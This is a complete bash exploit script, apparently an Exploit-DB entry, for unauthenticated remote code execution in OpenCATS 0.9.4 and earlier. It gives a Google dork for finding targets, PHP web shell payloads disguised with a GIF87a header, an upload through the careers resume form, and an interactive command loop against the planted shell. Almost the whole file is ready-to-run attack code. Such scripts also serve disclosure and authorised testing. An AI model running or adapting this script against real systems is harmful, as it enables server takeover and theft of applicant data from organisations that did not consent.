# Exploit Title: OpenCATS 0.9.4 - Remote Code Execution (RCE)
# Google Dork: intext:"Current Available Openings, Recently Posted Jobs"
# Date: 21/09/2021
# Exploit Author: Nicholas Ferreira - https://github.com/Nickguitar
# Vendor Homepage: https://www.opencats.org/
# Software Link: https://github.com/opencats/OpenCATS
# Version: <=0.9.4 Countach
# Tested on: Debian, CentOS, Windows Server

#!/bin/bash

if [ $# -eq 0 ]
then
	echo "Usage: $0 <target URL>"
	exit
fi



# if a payload doesn't work, try another

payload='GIF87a<?php echo system($_REQUEST[0]); ?>'
#payload='GIF87a<?php echo exec($_REQUEST[0]); ?>'
#payload='GIF87a<?php echo shell_exec($_REQUEST[0]); ?>'
#payload='GIF87a<?php echo passthru($_REQUEST[0]); ?>'
#payload='GIF87a<?php echo `$_REQUEST[0]`; ?>'
#payload='GIF87a<?php echo system($_REQUEST[0]); ?>'
#payload='GIF87a<?php echo $p=popen($_REQUEST[0],"r");while(!feof($p))echo fread($p,1024); ?>'

target=$1

green="\033[0;32m"
red="\033[0;31m"
reset="\033[0m"

#====================== Functions

rev() {
while true
	do echo -n -e "\n$ "
	read cmd
	curl -skL -X POST -d "0=$cmd" $1 | sed "s/^GIF87a//" | sed "$ d"
	done
}

upload() {
	curl -skL $1/$2 \
	-H "Connection: close" \
	-F resumeFile=@"$3;type=application/x-php" \
	-F ID="$firstJb" \
	-F candidateID="-1" \
	-F applyToJobSubAction="resumeLoad" \
	--compressed \
	--insecure
}

getVersion() {
	ver=`curl -skL $1 | grep -E "span.*([0-9]\.)+" | sed "s/<[^>]*>//g" | grep -Eo -m 1 "([0-9]\.)+[0-9]*"`

	if [ -z "${ver}" ]
	then
		ver=`curl -skL "$1/installtest.php" | grep -Eio "CATS version is ([0-9]\.)+[0-9]*" | grep -Eo -m 1 "([0-9]\.)+[0-9]*"`
		if [ -z "${ver}" ]
		then
			echo -e "${red}[-] Couldn't identity CATS version, but that's ok...${reset}"
			return 0
		fi
	fi
	echo -e "${green}[*] Version detected: $ver${reset}"
}

writePayload(){

	tmpfile=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 5)".php"
	file=`basename $tmpfile`
	echo "$1" > $tmpfile
}

banner(){
	echo "IF8uXyAgICAgXywtJyIiYC0uXyAKKCwtLmAuXywnKCAgICAgICB8XGAtL3wgICAgICAgIFJldkNBVCAtIE9wZW5DQVQgUkNFCiAgICBgLS4tJyBcICktYCggLCBvIG8pICAgICAgICAgTmljaG9sYXMgIEZlcnJlaXJhCiAgICAgICAgICBgLSAgICBcYF9gIictICAgaHR0cHM6Ly9naXRodWIuY29tL05pY2tndWl0YXI=" | base64 -d
	echo -e "\n"
}

#======================

banner

echo "[*] Attacking target $target"

echo "[*] Checking CATS version..."
getVersion $target
#exit

echo "[*] Creating temp file with payload..."
writePayload "$payload"

#exit

echo "[*] Checking active jobs..."

jbRequest=`curl -skL $target'/careers/index.php?m=careers&p=showAll'`
numJb=`echo "$jbRequest" | grep "Posted Jobs" |sed -E 's/.*: ([0-9]+).*/\1/'`
firstJb=`echo "$jbRequest" | grep -m 1 '<td><a href="index.php?m=careers' | sed -E 's/.*=([0-9]+)\".*/\1/'`

if [[ ! $numJb -gt 0 ]]
then
	echo -e "${red}[-] No active jobs found.${reset}"
	echo "[*] Trying another path..."
	jbRequest=`curl -skL $target'/index.php?m=careers&p=showAll'`
	numJb=`echo "$jbRequest" | grep "Posted Jobs" | sed -e 's/<[^>]*>//g' | sed -E 's/.*Posted Jobs.*: ([0-9]+).*/\1/'`

	if [[ ! $numJb -gt 0 ]]
	then
		echo -e "${red}[-] Couldn't find any active job.${reset}"
		exit
	fi
fi

firstJb=`echo "$jbRequest" | grep -m 1 '<td><a href="index.php?m=careers' | sed -E 's/.*=([0-9]+)\".*/\1/'`

echo -e "${green}[+] Jobs found! Using job id $firstJb${reset}"
echo "[*] Sending payload..."

req=`upload "$target" "/careers/index.php?m=careers&p=onApplyToJobOrder" "$tmpfile"`

if ! `echo "$req" | egrep -q "still be uploaded|will be uploaded|$file"`
then
	echo -e "${red}[-] Couldn't detect if payload was uploaded${reset}"
	echo "[*] Checking by another method..."

	sed -i "s/GIF87a//" $tmpfile

	req=`upload "$target" "index.php?m=careers&p=onApplyToJobOrder" "$tmpfile"`

	if ! `echo "$req" | egrep -q "still be uploaded|will be uploaded|$file"`
	then
		echo -e "${red}[-] Couldn't upload payload...${reset}"
		exit
	fi
fi

echo -e "${green}[+] Payload $file uploaded!"
echo "[*] Deleting created temp file..."
rm $tmpfile
echo "[*] Checking shell..."
check=$(curl -skL -d '0=echo 0x7359' "$target/upload/careerportaladd/$file")
if `echo $check | grep -q "0x7359"`
then
	echo -e "${green}[+] Got shell! :D${reset}"
	curl -skL -X POST -d "0=id;uname -a" "$target/upload/careerportaladd/$file" | sed "s/^GIF87a//" | sed "$ d"
	rev $target/upload/careerportaladd/$file
else
	echo -e "${red}[-] Couldn't get reverse shell.\n Maybe you should try it manually or use another payload.${reset}"
fi